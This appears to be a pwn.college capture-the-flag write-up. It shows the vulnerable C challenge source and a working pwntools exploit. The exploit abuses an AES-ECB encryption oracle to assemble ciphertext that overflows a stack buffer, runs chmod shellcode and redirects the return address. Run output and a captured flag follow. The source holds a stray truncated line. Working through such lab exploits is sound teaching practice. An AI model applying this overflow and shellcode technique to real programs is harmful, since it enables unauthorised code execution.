#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <openssl/evp.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

void __attribute__((constructor)) disable_aslr(int argc, char **argv, char **envp)
{
    int current_personality = personality(0xffffffff);
    assert(current_personality != -1);
    if ((current_personality & ADDR_NO_RANDOMIZE) == 0)
    {
        assert(personality(current_personality | ADDR_NO_RANDOMIZE) != -1);
        assert(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != -1);
        execve("/proc/self/exe", argv, envp);
    }
}

EVP_CIPHER_CTX *ctx;

int challenge(int argc, char **argv, char **envp)
{
    unsigned char key[16];
    struct
    {
        char header[8];
        unsigned long long length;
        char message[31];
    } plaintext = {0};

    // initialize the cipher
    int key_file = open("/challenge/.key", O_RDONLY);
    assert(key_file);
    assert(read(key_file, key, 16) == 16);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    close(key_file);

    char *ciphertext = malloc(0x1000);
    size_t ciphertext_len = read(0, ciphertext, 0x1000);
    assert(ciphertext_len % 16 == 0);  // should be padded
    assert(ciphertext_len >= 16);      // at least one block

    // first, we verify the first block
    int decrypted_len;
    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);

    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
    assert(plaintext.length <= 16); // verify length

    // decrypt the message!
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    memset(key, 0, sizeof(key));
    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);

    printf("Decrypted message: %s!\n", plaintext.message);

    fprintf(stderr, "You've loaded the following shellcode into your message:\n");
    print_disassembly(plaintext.message, decrypted_len);
    fprintf(stderr, "\n");

c

}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    challenge(argc, argv, envp);

}
```



## Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

# Initialize values
buffer_addr = 0x7fffffffe560
addr_of_saved_ip = 0x7fffffffe5b8 
shellcode_addr = 0x7fffffffe560

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Block 2 - Shellcode
shellcode_asm = """
   /* chmod("z", 0004) */
   push 0x5a
   push rsp
   pop rdi
   pop rax
   mov sil, 0x4
   syscall
"""
shellcode = asm(shellcode_asm).ljust(16, b'\x90')
shellcode_cipher = get_encrypted_block(shellcode)
shellcode_block = shellcode_cipher[16:32]

# Block 2-6 - Padding chain
padding_harvest = get_encrypted_block(b"B" * 16)
padding_block = padding_harvest[16:32]
padding_blocks = padding_block * 4

# Block 7 - Return address overwrite
shellcode_addr_block = b"C" * 8 
shellcode_addr_block += p64(shellcode_addr)
return_addr_cipher = get_encrypted_block(shellcode_addr_block)
return_address_block = return_addr_cipher[16:32]

# Block 8 - PKCS7 padding
pkcs_padding_suffix = sample_cipher[-16:]

# Craft payload
payload = header_block 
payload += shellcode_block
payload += padding_blocks
payload += return_address_block 
payload += pkcs_padding_suffix

# 5. Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-shellcode-easy:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (128 bytes) to target...
Your message header: VERIFIED\x01
Your message length: 1
Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCC`\xe5\xff\xff\xff\x7f!
You've loaded the following shellcode into your message:
ERROR: Failed to disassemble shellcode! Bytes are:

      Address      |                      Bytes
--------------------------------------------------------------------
0x00007fffffffe560 | 6a 5a 54 5f 58 40 b6 04 0f 05 90 90 90 90 90 90 

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fffffffe520 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe528 (rsp+0x0008) | e8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6e8 |
| 0x00007fffffffe530 (rsp+0x0010) | d8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6d8 |
| 0x00007fffffffe538 (rsp+0x0018) | a0 b6 ca f6 01 00 00 00 | 0x00000001f6cab6a0 |
| 0x00007fffffffe540 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe548 (rsp+0x0028) | 25 05 b5 f6 01 00 00 00 | 0x00000001f6b50525 |
| 0x00007fffffffe550 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
| 0x00007fffffffe558 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007fffffffe560 (rsp+0x0040) | 6a 5a 54 5f 58 40 b6 04 | 0x04b640585f545a6a |
| 0x00007fffffffe568 (rsp+0x0048) | 0f 05 90 90 90 90 90 90 | 0x909090909090050f |
| 0x00007fffffffe570 (rsp+0x0050) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe578 (rsp+0x0058) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe580 (rsp+0x0060) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe588 (rsp+0x0068) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe590 (rsp+0x0070) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe598 (rsp+0x0078) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe5a0 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe5a8 (rsp+0x0088) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe5b0 (rsp+0x0090) | 43 43 43 43 43 43 43 43 | 0x4343434343434343 |
| 0x00007fffffffe5b8 (rsp+0x0098) | 60 e5 ff ff ff 7f 00 00 | 0x00007fffffffe560 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fffffffe560
- the saved return address (previously to main) is at 0x7fffffffe5b8
$  
```

```
hacker@integrated-security~ecb-to-shellcode-easy:~$ cat ~/Z
pwn.college{8sn6D2nxMYonmCE6lgbNgdP45f9.QX5UDMxEDL4ITM0EzW}
```